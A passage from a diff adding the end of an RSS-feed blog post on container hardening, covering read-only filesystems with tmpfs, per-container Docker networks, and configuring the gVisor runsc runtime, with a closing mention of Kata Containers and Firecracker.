+<p>However, the image may not be perfect and still require read/write access to some parts of the filesystem, likely directories such as <code>/tmp</code>, <code>/run</code> or <code>/var</code>. You can make a <strong>tmpfs</strong> for those (a temporary filesystem in the container attributed memory), because they&rsquo;re not persistent data anyway.</p>
+<p>In a Compose file, that would look like the following settings:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    read_only: true
+</span></span><span class="line"><span class="cl">    tmpfs:
+</span></span><span class="line"><span class="cl">        - /tmp:size=10M,mode=0770,uid=1000,gid=1000,noexec,nosuid,nodev
+</span></span></code></pre></div><p>That is quite verbose indeed, but that&rsquo;s to show you the different options for a tmpfs mount. You want to restrict them in size and permissions ideally.</p>
+<h3 id="network-isolation">Network isolation</h3>
+<p>By default, all Docker containers will use the default network bridge. They will see and be able to communicate with each other. Each container should have its own user-defined bridge network, and each connection between containers should have an internal network. If you intend to run a reverse proxy in front of several containers, you should make a dedicated network for each container you want to expose to the reverse proxy.</p>
+<p>The <code>--network host</code> option also shouldn&rsquo;t be used for obvious reasons since the container would share the same network as the host, providing no isolation at all.</p>
+<h2 id="alternative-runtimes-gvisor">Alternative runtimes (gVisor)</h2>
+<p><code>runc</code> is the reference OCI runtime, but that means other runtimes can exist as well as long as they&rsquo;re compliant with the OCI standard. These runtimes can be interchanged quite seamlessly. There&rsquo;s a few alternatives, such as <a href="https://github.com/containers/crun">crun</a> or <a href="https://github.com/containers/youki">youki</a>, respectively implemented in C and Rust (<code>runc</code> is a Go implementation). However, there is one particular runtime that does a lot more for security: <code>runsc</code>, provided by the <a href="https://gvisor.dev/">gVisor project</a> by the folks at Google.</p>
+<p><strong>Containers are not a sandbox</strong>, and while we can improve their security, they will fundamentally share a common attack surface with the host. Virtual machines are a solution to that problem, but you might prefer container semantics and ecosystem. gVisor can be perceived as an attempt to get the &ldquo;best of both worlds&rdquo;: containers that are easy to manage while providing a native isolation boundary. gVisor did just that by implementing two things:</p>
+<ul>
+<li><strong>Sentry</strong>: an application kernel in Go, a language known to be memory-safe. It implements the Linux logic in userspace such as various system calls.</li>
+<li><strong>Gofer</strong>: a host process which communicates with Sentry and the host filesystem, since Sentry is restricted in that aspect.</li>
+</ul>
+<p>A platform like ptrace or KVM is used to intercept system calls and redirect them from the application to Sentry, which is running in the userspace. This has some costs: there is a higher per-syscall overhead, and compatibility is reduced since not all syscalls are implemented. On top of that, gVisor employs security mechanisms we&rsquo;ve glanced over above, such as a <a href="https://github.com/google/gvisor/blob/86ad7d5b5838da1b539e976886d04b93c939ca3d/runsc/boot/filter/config.go">very restrictive seccomp profile</a> between Sentry and the host kernel, the <a href="https://github.com/google/gvisor/blob/6ef268409620c57197b9d573e23be8cb05dbf381/pkg/sentry/kernel/task_identity.go#L464">no_new_privs bit</a>, and isolated namespaces from the host.</p>
+<p>The security model of gVisor is comparable to what you would expect from a virtual machine. It is also very easy to <a href="https://gvisor.dev/docs/user_guide/install/">install and use</a>. The path to runsc along with its different configuration flags (<code>runsc flags</code>) should be added to <code>/etc/docker/daemon.json</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl">    <span class="s2">&#34;runtimes&#34;</span><span class="err">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;runsc-ptrace&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;path&#34;</span><span class="p">:</span> <span class="s2">&#34;/usr/local/bin/runsc&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;runtimeArgs&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;--platform=ptrace&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;runsc-kvm&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;path&#34;</span><span class="p">:</span> <span class="s2">&#34;/usr/local/bin/runsc&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;runtimeArgs&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;--platform=kvm&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><p><code>runsc</code> needs to start with root to set up some mitigations, including the use of its own network stack separated from the host. The sandbox itself drops privileges to nobody as soon as possible. You can still use <code>runsc</code> rootless if you want (which should be needed for Podman):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./runsc --rootless do uname -a
+</span></span><span class="line"><span class="cl">*** Warning: sandbox network isn&#39;t supported with --rootless, switching to host ***
+</span></span><span class="line"><span class="cl">Linux 4.4.0 #1 SMP Sun Jan 10 15:06:54 PST 2016 x86_64 GNU/Linux
+</span></span></code></pre></div><p>Linux 4.4.0 is shown because that is the version of the Linux API that Sentry tries to mimic. As you&rsquo;ve probably guessed, you&rsquo;re not really using Linux 4.4.0, but the application kernel that behaves like it. By the way, gVisor is of course compatible with cgroups.</p>
+<h2 id="conclusion-whats-a-container-after-all">Conclusion: what&rsquo;s a container after all?</h2>
+<p>Like I wrote above, a container is mostly defined by its semantics and ecosystem. Containers shouldn&rsquo;t be solely defined by the OCI reference runtime implementation, as we&rsquo;ve seen with gVisor that provides an entirely different security model.</p>
+<p>Still not convinced? What if I told you a container can leverage the same technologies as a virtual machine? That is exactly what <a href="https://katacontainers.io/">Kata Containers</a> does by using a VMM like QEMU-lite to provide containers that are in fact lightweight virtual machines, with their traditional resources and security model, compatibility with container semantics and toolset, and an optimized overhead. While not in the OCI ecosystem, Amazon achieves quite the same with <a href="https://firecracker-microvm.github.io/">Firecracker</a>.</p>
+<p>If you&rsquo;re running untrusted workloads, I highly suggest you consider gVisor instead of a traditional container runtime. Your definition of &ldquo;untrusted&rdquo; may vary: for me, almost everything should be considered untrusted. That is how modern security works, and how mobile operating systems work. It&rsquo;s quite simple, security should be simple, and gVisor simply offers native security.</p>
+<p>Containers are a popular, yet strange world. They revolutionized the way we make and deploy software, but one should not loose the sight of what they really are and aren&rsquo;t. This hardening guide is non-exhaustive, but I hope it can make you aware of some aspects you&rsquo;ve never thought of.</p>
+]]></content:encoded>
+    </item>
+    
+  </channel>
+</rss>
